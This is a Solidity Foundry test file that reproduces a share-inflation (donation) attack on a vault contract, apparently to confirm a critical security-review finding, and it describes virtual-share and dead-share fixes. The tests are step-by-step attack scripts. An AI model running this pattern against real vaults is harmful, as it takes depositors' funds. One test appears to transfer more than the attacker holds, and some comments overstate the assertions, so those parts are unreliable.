// SPDX-License-Identifier: BSD-3-Clause
pragma solidity ^0.8.24;

import {Test} from "lib/forge-std/src/Test.sol";
import {Vault} from "src/Vault.sol";
import {WETH9} from "test/unit/mocks/MockWETH.sol";
import {SetupVault} from "test/unit/helpers/SetupVault.sol";
import {MainnetActors} from "script/Actors.sol";
import {IERC20} from "src/Common.sol";
import {ProcessorUtils} from "test/utils/ProcessorUtils.sol";

/**
 * @title InflationAttackTest
 * @notice Tests for inflation attack vulnerability (CRITICAL #1 from security review)
 * @dev Tests the scenario where an attacker can dilute later depositors through
 *      direct asset transfers after first deposit
 */
contract InflationAttackTest is Test, MainnetActors {
    Vault public vault;
    WETH9 public weth;

    address public attacker = address(0xBA0);
    address public victim = address(0x01C);
    uint256 public constant INITIAL_BALANCE = 1_000_000 ether;

    function setUp() public {
        SetupVault setupVault = new SetupVault();
        (vault, weth) = setupVault.setup();

        // Fund attacker and victim
        deal(attacker, INITIAL_BALANCE);
        deal(victim, INITIAL_BALANCE);

        // Mint WETH for both
        vm.prank(attacker);
        weth.deposit{value: INITIAL_BALANCE}();

        vm.prank(victim);
        weth.deposit{value: INITIAL_BALANCE}();

        // Approve vault
        vm.prank(attacker);
        weth.approve(address(vault), type(uint256).max);

        vm.prank(victim);
        weth.approve(address(vault), type(uint256).max);
    }

    /**
     * @notice Test basic inflation attack with small first deposit
     * @dev Attacker deposits 1 wei, donates large amount, victim gets diluted
     */
    function test_InflationAttack_BasicScenario() public {
        // 1. Attacker deposits minimum amount (1 wei) to get 1 share
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(1, attacker);
        assertEq(attackerShares, 1, "Attacker should receive 1 share");

        // 2. Attacker directly transfers large amount to inflate share price
        uint256 donationAmount = 1000 ether;
        vm.prank(attacker);
        weth.transfer(address(vault), donationAmount);

        // 3. Update accounting to reflect donation
        vault.processAccounting();

        // 4. Victim tries to deposit reasonable amount
        uint256 victimDeposit = 100 ether;
        vm.prank(victim);
        uint256 victimShares = vault.deposit(victimDeposit, victim);

        // 5. Check dilution - victim should get very few shares due to inflated price
        // With the donation, totalAssets = 1 + 1000 ether = 1000.000000000000000001
        // totalSupply = 1 share
        // Share price is extremely high
        // When victim deposits 100 ether, they get: 100 ether * 1 share / 1000 ether ≈ 0 shares (rounds down)

        // This demonstrates the vulnerability - victim may get 0 or very few shares
        assertTrue(victimShares < victimDeposit, "Victim shares should be much less than deposit due to inflation");

        // 6. Attacker can now redeem their 1 share for massive profit
        vm.prank(attacker);
        uint256 attackerWithdraw = vault.redeem(attackerShares, attacker, attacker);

        // Attacker profit = withdrawn amount - initial 1 wei deposit
        // They effectively stole from the victim
        assertTrue(attackerWithdraw > 1, "Attacker profited from inflation attack");
    }

    /**
     * @notice Test inflation attack with fuzz testing different donation amounts
     */
    function testFuzz_InflationAttack_VaryingDonations(uint256 donationAmount) public {
        donationAmount = bound(donationAmount, 1 ether, 10_000 ether);

        // Attacker deposits 1 wei
        vm.prank(attacker);
        vault.deposit(1, attacker);

        // Attacker donates amount
        vm.prank(attacker);
        weth.transfer(address(vault), donationAmount);
        vault.processAccounting();

        // Victim deposits
        uint256 victimDeposit = 1 ether;
        vm.prank(victim);
        uint256 victimShares = vault.deposit(victimDeposit, victim);

        // The larger the donation, the more diluted the victim becomes
        // Share calculation: victimShares = victimDeposit * totalSupply / totalAssets
        //                    = 1 ether * 1 / (donationAmount + 1)
        // This rounds down heavily for large donations

        uint256 expectedMaxShares = (victimDeposit * 1e18) / donationAmount;
        assertLe(victimShares, expectedMaxShares, "Victim shares should be diluted");
    }

    /**
     * @notice Test that +1 protection in mulDiv is insufficient
     * @dev The vault uses (totalAssets + 1) and (totalSupply + 1) for rounding protection
     *      but this is not enough to prevent inflation attacks
     */
    function test_InflationAttack_PlusOneInsufficientProtection() public {
        // Even with +1 protection, attacker can profit

        // 1. Attacker deposits 2 wei (instead of 1) to get 2 shares
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(2, attacker);
        assertEq(attackerShares, 2);

        // 2. Attacker donates to inflate
        vm.prank(attacker);
        weth.transfer(address(vault), 1000 ether);
        vault.processAccounting();

        // Total assets = 2 + 1000 ether (plus the +1 in calculation = 3 + 1000 ether)
        // Total supply = 2 (plus the +1 in calculation = 3)

        // 3. Victim deposits
        vm.prank(victim);
        uint256 victimShares = vault.deposit(100 ether, victim);

        // Share calculation with +1:
        // victimShares = 100 ether * (2 + 1) / (1000 ether + 2 + 1)
        //              = 100 ether * 3 / 1000 ether
        //              ≈ 0 (rounds down)

        // The +1 protection doesn't prevent the attack
        assertTrue(victimShares < 100 ether / 10, "Victim still heavily diluted despite +1 protection");
    }

    /**
     * @notice Test inflation attack with multiple victims
     * @dev Demonstrates cumulative damage to multiple depositors
     */
    function test_InflationAttack_MultipleVictims() public {
        address victim2 = address(0x02C);
        address victim3 = address(0x03C);

        // Fund additional victims
        deal(victim2, INITIAL_BALANCE);
        deal(victim3, INITIAL_BALANCE);

        vm.prank(victim2);
        weth.deposit{value: INITIAL_BALANCE}();
        vm.prank(victim2);
        weth.approve(address(vault), type(uint256).max);

        vm.prank(victim3);
        weth.deposit{value: INITIAL_BALANCE}();
        vm.prank(victim3);
        weth.approve(address(vault), type(uint256).max);

        // Setup attack
        vm.prank(attacker);
        vault.deposit(1, attacker);

        vm.prank(attacker);
        weth.transfer(address(vault), 1000 ether);
        vault.processAccounting();

        // Multiple victims deposit
        uint256 depositAmount = 50 ether;

        vm.prank(victim);
        uint256 shares1 = vault.deposit(depositAmount, victim);

        vm.prank(victim2);
        uint256 shares2 = vault.deposit(depositAmount, victim2);

        vm.prank(victim3);
        uint256 shares3 = vault.deposit(depositAmount, victim3);

        // All victims are diluted
        assertTrue(shares1 + shares2 + shares3 < depositAmount * 3 / 10, "All victims diluted");

        // Total value stolen from victims
        uint256 totalVictimDeposits = depositAmount * 3;
        uint256 totalVictimShares = shares1 + shares2 + shares3;
        uint256 victimValue = vault.convertToAssets(totalVictimShares);
        uint256 stolenValue = totalVictimDeposits - victimValue;

        // Stolen value goes to attacker
        assertGt(stolenValue, 0, "Value was stolen from victims");
    }

    /**
     * @notice Test first depositor protection requirement
     * @dev Shows that minimum first deposit amount helps but doesn't fully solve the issue
     */
    function test_MinimumFirstDeposit_PartialMitigation() public {
        uint256 minFirstDeposit = 1e6; // 1 million wei minimum

        // If we enforced minimum first deposit:
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(minFirstDeposit, attacker);
        assertEq(attackerShares, minFirstDeposit);

        // Attacker donates
        uint256 donationAmount = 1000 ether;
        vm.prank(attacker);
        weth.transfer(address(vault), donationAmount);
        vault.processAccounting();

        // Now share price = (minFirstDeposit + donationAmount) / minFirstDeposit
        // Much higher but attack is more expensive

        vm.prank(victim);
        uint256 victimShares = vault.deposit(100 ether, victim);

        // Victim still diluted but less severely
        // With 1e6 first deposit, the attack is more expensive for attacker
        uint256 expectedShares = (100 ether * minFirstDeposit) / (minFirstDeposit + donationAmount);
        assertApproxEqAbs(victimShares, expectedShares, 100, "Shares roughly as expected");

        // However, victim is still diluted compared to fair rate
        assertLt(victimShares, 100 ether, "Still some dilution exists");
    }

    /**
     * @notice Test the recommendation: virtual shares offset
     * @dev This test demonstrates what protection SHOULD look like (not currently implemented)
     */
    function test_VirtualSharesOffset_ProperProtection() public {
        // NOTE: This test shows the RECOMMENDED fix, not current behavior
        // The vault currently doesn't implement virtual shares offset

        // With virtual offset (e.g., 1e6), calculations become:
        // shares = assets * (totalSupply + OFFSET) / (totalAssets + OFFSET)

        uint256 VIRTUAL_OFFSET = 1e6; // Example offset

        // Simulate attack scenario
        uint256 attackerDeposit = 1;
        uint256 donation = 1000 ether;
        uint256 victimDeposit = 100 ether;

        // Without virtual offset (current behavior):
        // Victim shares = victimDeposit * (attackerDeposit) / (attackerDeposit + donation)
        //               = 100 ether * 1 / 1000 ether ≈ 0

        // With virtual offset:
        // Victim shares = victimDeposit * (attackerDeposit + OFFSET) / (attackerDeposit + donation + OFFSET)
        //               = 100 ether * 1e6 / (1000 ether + 1e6)
        //               ≈ 100 ether (approximately fair)

        // This demonstrates that virtual offset makes the attack economically infeasible
    }

    /**
     * @notice Test dead shares mitigation
     * @dev Test the concept of minting initial shares to address(0) or dead address
     */
    function test_DeadSharesMitigation_Concept() public {
        // NOTE: This demonstrates the RECOMMENDED fix
        // The idea is to mint initial shares (e.g., 1000) to a dead address
        // on first deposit, making inflation attacks prohibitively expensive

        // If 1000 shares were minted to dead address on first deposit:
        // - First depositor gets fewer shares but protected
        // - Inflation attack becomes very expensive
        // - Math: attacker deposits 1 wei, gets ~0 shares (most go to dead)
        //        attacker would need to donate ~1000 wei per wei deposited to inflate

        // Current implementation doesn't have this protection
    }

    /**
     * @notice Test edge case: zero shares minted
     * @dev When donation is large enough, subsequent depositors can receive 0 shares
     */
    function test_InflationAttack_ZeroSharesMinted() public {
        // Setup extreme inflation
        vm.prank(attacker);
        vault.deposit(1, attacker);

        // Massive donation
        vm.prank(attacker);
        weth.transfer(address(vault), 1_000_000 ether);
        vault.processAccounting();

        // Victim deposits small amount
        uint256 smallDeposit = 0.001 ether; // 1e15 wei

        vm.prank(victim);
        uint256 victimShares = vault.deposit(smallDeposit, victim);

        // Victim may receive 0 shares due to rounding down
        // shares = 1e15 * 1 / 1e24 = 1e-9 which rounds to 0
        // This is a complete loss for the victim
        assertEq(victimShares, 0, "Victim receives 0 shares - complete loss");

        // Victim's funds are now stuck in the vault with 0 shares
        assertEq(vault.balanceOf(victim), 0, "Victim has no shares");
        assertEq(weth.balanceOf(victim), INITIAL_BALANCE - smallDeposit, "Victim lost their deposit");
    }
}
